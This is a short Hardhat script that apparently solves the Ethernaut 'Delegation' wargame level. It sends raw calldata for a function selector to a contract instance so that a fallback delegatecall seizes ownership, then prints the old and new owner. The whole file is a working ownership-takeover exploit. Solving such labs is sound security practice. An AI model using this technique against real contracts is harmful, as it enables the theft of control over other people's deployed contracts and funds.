const hre = require("hardhat");

async function main() {
  const [owner] = await ethers.getSigners();
  const DelegationContract = await hre.ethers.getContractFactory("Delegation");
  // attach your instance address
  const Instance = "0xC4bA89CBDbDC8C75Ea613c6e2992FadbDaaB9e84";
  const Delegation = DelegationContract.attach(Instance);
  const oldOwner = await Delegation.owner();

  const fnSelector = "0xdd365b8b";

  await owner.sendTransaction({
    to: Delegation.address,
    data: fnSelector,
    gasLimit: hre.ethers.BigNumber.from(`100000`),
  });

  const newOwner = await Delegation.owner();
  console.log(oldOwner, newOwner);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
